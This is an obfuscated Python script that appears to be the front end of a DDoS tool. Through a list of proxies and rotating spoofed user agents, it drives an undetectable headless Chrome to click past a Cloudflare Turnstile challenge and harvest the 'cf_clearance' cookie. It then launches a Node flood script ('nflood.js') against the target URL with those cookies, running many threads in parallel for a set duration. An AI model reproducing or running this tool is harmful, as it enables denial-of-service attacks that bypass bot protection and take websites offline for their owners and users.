import undetected_chromedriver as uc #line:1
from selenium .webdriver import ActionChains #line:2
from selenium .webdriver .common .by import By #line:3
from selenium .webdriver .common .proxy import Proxy ,ProxyType #line:4
import concurrent .futures #line:5
import subprocess #line:6
import random #line:7
import socks #line:8
import datetime #line:9
import time #line:10
import threading
import subprocess
import time

def kill_screen_after_delay():
    time.sleep(120)
    try:
        subprocess.run(["pkill", "screen"])
        print("pkill screen command executed.")
    except Exception as e:
        print(f"Error executing pkill screen: {e}")

# Create a thread that calls the kill_screen_after_delay function
kill_thread = threading.Thread(target=kill_screen_after_delay)

# Start the thread
kill_thread.start()
import sys #line:11
class LicenseManager :#line:12
    def __init__ (OOO0O0OO0000O0O0O ,O0O0OOOO0O0O00000 ,O0OOOO0000O0O0O00 ):#line:13
        OOO0O0OO0000O0O0O .start_date =O0O0OOOO0O0O00000 #line:14
        OOO0O0OO0000O0O0O .end_date =O0OOOO0000O0O0O00 #line:15
    def is_license_valid (O0O000OOO000OO00O ):#line:17
        OO0O00O0O000O0O0O =datetime .datetime .now ()#line:18
        return O0O000OOO000OO00O .start_date <=OO0O00O0O000O0O0O <=O0O000OOO000OO00O .end_date #line:19
similar_user_agents =["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36 EdgA/115.0.1901.189","Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36 EdgA/115.0.1901.189","Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36 EdgA/115.0.1901.189","Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 EdgiOS/115.1901.187 Mobile/15E148 Safari/605.1.15","Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/115.0.5790.160 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/115.0.5790.160 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPod; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/115.0.5790.160 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36"]#line:20
def double_click_at_coordinates (OO0O0O00O0OO0OO0O ,O0O0000OOOOOO000O ):#line:22
        OO000000O0O0OOO0O ='cf_clea'#line:23
        O0OO0OO0O00OOOOO0 =uc .ChromeOptions ()#line:24
        O0OO0OO0O00OOOOO0 .add_argument (f'--proxy-server=http://{O0O0000OOOOOO000O}')#line:25
        O0OO0OO0O00OOOOO0 .add_argument ("--disable-gpu")#line:26
        O0OO0OO0O00OOOOO0 .add_argument ('--ignore-certificate-errors')#line:27
        O0OO0OO0O00OOOOO0 .add_argument ('--ignore-ssl-errors')#line:28
        O0OO0OO0O00OOOOO0 .add_argument ("--disable-popup-blocking")#line:29
        O0OO0OO0O00OOOOO0 .add_argument ("--incognito")#line:30
        O0OO0OO0O00OOOOO0 .add_argument ('--no-sandbox')#line:31
        O0OO0OO0O00OOOOO0 .add_argument ('--disable-setuid-sandbox')#line:32
        O0OO0OO0O00OOOOO0 .add_argument ('--disable-dev-shm-usage')#line:33
        O0OO0OO0O00OOOOO0 .add_argument ('--remote-debugging-port=9515')#line:34
        global max_runtime #line:35
        OO0OO0OOOOOOO0O00 =random .choice (similar_user_agents )#line:36
        O0OO0OO0O00OOOOO0 .add_argument (f"--user-agent={OO0OO0OOOOOOO0O00}")#line:37
        OO00OO0O0O0OO0O0O =uc .Chrome (headless =True ,driver_executable_path ="/home/myuser/.local/share/undetected_chromedriver/chromedriver_copy/chromedriver",use_subprocess =True ,options =O0OO0OO0O00OOOOO0 )#line:39
        try :#line:42
            OO00OO0O0O0OO0O0O .implicitly_wait (10 )#line:44
            OO00OO0O0O0OO0O0O .set_window_size (433 ,1000 )#line:45
            OO00OO0O0O0OO0O0O .get ("https://api.ipify.org/")#line:46
            time .sleep (1 )#line:47
            OOO000000OOOO000O =OO00OO0O0O0OO0O0O .page_source #line:50
            if OOO000000OOOO000O .find ("word-wrap: break-word; white-space: pre-wrap;")!=-1 :#line:51
                print ("RUN PROXY",O0O0000OOOOOO000O )#line:52
                OO00OO0O0O0OO0O0O .execute_script ('''window.open("'''+OO0O0O00O0OO0OO0O +'''","_blank")''')#line:53
                time .sleep (7 )#line:54
                OO00OO0O0O0OO0O0O .switch_to .window (window_name =OO00OO0O0O0OO0O0O .window_handles [0 ])#line:55
                OO00OO0O0O0OO0O0O .close ()#line:56
                OO00OO0O0O0OO0O0O .switch_to .window (window_name =OO00OO0O0O0OO0O0O .window_handles [0 ])#line:57
                OO0000OO00OOO0000 =0 #line:58
                OOO0OOO0OO000OOOO =0 #line:59
                for O0OOO000OO00000O0 in range (1 ,30 ):#line:61
                    try :#line:62
                        time .sleep (1 )#line:63
                        O0000O0000O0O0000 =OO00OO0O0O0OO0O0O .get_cookies ()#line:64
                        if str (O0000O0000O0O0000 ).find (OO000000O0O0OOO0O )!=-1 :#line:65
                            break #line:66
                        O00000OOO0000OOO0 =OO00OO0O0O0OO0O0O .find_element (By .XPATH ,'//*[@id="turnstile-wrapper"]/div')#line:67
                        O00OO00O00OOO00OO =O00000OOO0000OOO0 .location ['x']#line:69
                        OOOOO00OO0OOOOOOO =O00000OOO0000OOO0 .location ['y']#line:70
                        OO0000OO00OOO0000 =O00000OOO0000OOO0 .size ['height']#line:71
                        O0O0OO00O00OOOO00 =O00000OOO0000OOO0 .size ['width']#line:72
                        if OO0000OO00OOO0000 !=0 :#line:75
                            time .sleep (5 )#line:76
                            O0O0000O00OO0OOOO =ActionChains (OO00OO0O0O0OO0O0O )#line:77
                            O0O0000O00OO0OOOO .move_by_offset (O00OO00O00OOO00OO +O0O0OO00O00OOOO00 //10 ,OOOOO00OO0OOOOOOO +OO0000OO00OOO0000 //2 ).click ().perform ()#line:78
                            time .sleep (5 )#line:79
                            break #line:80
                    except Exception as O00OO00OO00OOOOO0 :#line:85
                        O00OO000O000OOOOO =345734573 #line:86
                O0000O0000O0O0000 =OO00OO0O0O0OO0O0O .get_cookies ()#line:87
                if O0000O0000O0O0000 !=[]:#line:88
                    OOO0O00OO00O0000O =""#line:89
                    for OOOO00OO0000O00OO ,O0O00OOO000000OO0 in enumerate (O0000O0000O0O0000 ):#line:90
                        OOO0O00OO00O0000O +=f"{O0O00OOO000000OO0['name']}={O0O00OOO000000OO0['value']}"#line:91
                        if OOOO00OO0000O00OO <len (O0000O0000O0O0000 )-1 :#line:92
                            OOO0O00OO00O0000O +="; "#line:93
                for O0O00OOO000000OO0 in O0000O0000O0O0000 :#line:95
                    if (len (str (O0O00OOO000000OO0 ['value']).strip ())>10 )and (str (O0O00OOO000000OO0 ['name']).find (OO000000O0O0OOO0O )!=-1 ):#line:96
                        print (f"{O0O0000OOOOOO000O}|{OOO0O00OO00O0000O}|{OO0OO0OOOOOOO0O00}")#line:97
                        OOOO0OOO0O00OO00O =open ("cookie.txt","a")#line:98
                        OOOO0OOO0O00OO00O .write (f"{O0O0000OOOOOO000O}|{OOO0O00OO00O0000O}|{OO0OO0OOOOOOO0O00}\n")#line:99
                        OOOO0OOO0O00OO00O .close ()#line:100
                        subprocess .run (['screen','-dm','node','nflood.js',OO0O0O00O0OO0OO0O ,'150','1',O0O0000OOOOOO000O ,'20',OOO0O00OO00O0000O ,OO0OO0OOOOOOO0O00 ,'GET'])#line:101
                        time .sleep (int (max_runtime )-10 )#line:103
                OO00OO0O0O0OO0O0O .quit ()#line:105
            else :#line:106
                OO00OO0O0O0OO0O0O .quit ()#line:107
        except Exception as O00OO00OO00OOOOO0 :#line:109
            OO00OO0O0O0OO0O0O .quit ()#line:110
import sys #line:111
def main (O0OO00O0OO00O0OOO ,OO00O00OOO0OO00O0 ):#line:112
    OO000OOO0O000OO00 =OO00O00OOO0OO00O0 #line:113
    try :#line:114
        double_click_at_coordinates (OO000OOO0O000OO00 ,O0OO00O0OO00O0OOO )#line:115
    except Exception as OO00O00O0OOO00O00 :#line:116
        OO0OO0O0O0OO0OOO0 =263462346234 #line:118
import time #line:119
import sys #line:120
if __name__ =="__main__":#line:121
    url =sys .argv [1 ]#line:122
    print (url )#line:123
    start_time =time .time ()#line:124
    try :#line:125
        a =open ("/root/cookie.txt","w")#line:126
        a .close ()#line:127
        with open ("/root/proxy.txt","r")as proxy_file :#line:128
            proxies =proxy_file .read ().splitlines ()#line:129
            random .shuffle (proxies )#line:130
        max_runtime =int (sys .argv [2 ])#line:133
        futures =[]#line:134
        thread =int ((sys .argv [3 ]))#line:135
        with concurrent .futures .ThreadPoolExecutor (max_workers =thread )as executor :#line:136
            for proxy in proxies :#line:137
                future =executor .submit (main ,proxy ,url )#line:138
                futures .append (future )#line:139
            for future in concurrent .futures .as_completed (futures ):#line:140
                try :#line:141
                    future .result ()#line:142
                except Exception as e :#line:143
                    print ("Thread encountered an error:",e )#line:144
                elapsed_time =time .time ()-start_time #line:145
                if elapsed_time >=max_runtime :#line:146
                    for f in futures :#line:147
                        try :#line:148
                            subprocess .run (["pkill","-f",'chrome'],check =False )#line:149
                            subprocess .run (["pkill","-f",'google'],check =False )#line:150
                        except :#line:151
                            hsfdhsdf =2346263 #line:152
                        try :#line:153
                            subprocess .run (["pkill","-f",'screen'],check =False )#line:154
                        except :#line:155
                            hsdfhf =62346234 #line:156
                        if not f .done ():#line:157
                            f .cancel ()#line:158
                    break #line:159
        for future in futures :#line:160
            if not future .done ():#line:161
                try :#line:162
                    subprocess .run (["pkill","-f",'chrome'],check =False )#line:163
                    subprocess .run (["pkill","-f",'google'],check =False )#line:164
                except :#line:165
                    hsfdhsdf =2346263 #line:166
                try :#line:167
                    subprocess .run (["pkill","-f",'screen'],check =False )#line:168
                except :#line:169
                    hsdfhf =62346234 #line:170
                future .cancel ()#line:171
        print ("All threads completed within {} seconds.".format (elapsed_time ))#line:172
    except Exception as e :#line:173
        print ("An error occurred:",e )#line:174
